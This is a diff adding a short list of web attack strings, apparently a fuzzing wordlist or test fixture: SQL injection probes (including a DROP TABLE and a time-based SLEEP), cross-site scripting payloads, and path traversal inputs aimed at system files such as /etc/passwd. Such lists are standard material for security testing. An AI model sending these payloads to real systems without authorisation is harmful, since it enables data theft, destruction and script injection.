@@ -1,0 +1,13 @@
+1' OR 1=1 --
+1 UNION SELECT 1,2,3
+admin'--
+1; DROP TABLE users
+1) AND SLEEP(5)--
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+javascript:alert(1)
+%3cscript%3ealert(1)%3c/script%3e
+../../etc/passwd
+%2e%2e%2fetc%2fpasswd
+%252e%252e%252fetc%252fpasswd
+..\..\windows\win.ini
